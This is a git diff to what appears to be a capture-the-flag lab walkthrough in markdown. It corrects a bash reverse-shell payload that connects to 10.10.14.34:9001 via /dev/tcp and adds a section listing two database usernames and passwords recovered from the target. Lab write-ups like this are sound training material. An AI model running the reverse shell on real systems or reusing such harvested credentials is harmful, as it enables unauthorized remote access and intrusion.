@@ -264,5 +264,17 @@ Nmap done: 1 IP address (1 host up) scanned in 182.51 seconds
 ![image](https://user-images.githubusercontent.com/83878909/229378335-153e312c-3b94-4d2c-a95a-43ad5601828e.png)
 
 ### Reverse Shell
-Reverse Shell Payload: `bash -c'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'`
+Reverse Shell Payload: `bash -c 'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'`
+![image](https://user-images.githubusercontent.com/83878909/229379635-af5150f5-365e-42f6-8a74-80cabca40bff.png)
+![image](https://user-images.githubusercontent.com/83878909/229379649-22cfe55d-bb0a-44ae-8af7-81eae87e567d.png)
+
+---
+
+## Information Gathering
+![image](https://user-images.githubusercontent.com/83878909/229379861-82079dfc-6543-4706-809a-ebe5f4d2518f.png)
+- DB User: `unixusrmgr:dheu%7wjx8B&`
+![image](https://user-images.githubusercontent.com/83878909/229379727-6b8f9f3a-9fa8-4c2a-a46e-c542fd0e72bb.png)
+- DB User: `dbcross:LOSPxnme4f5pH5wp`
+
+
 
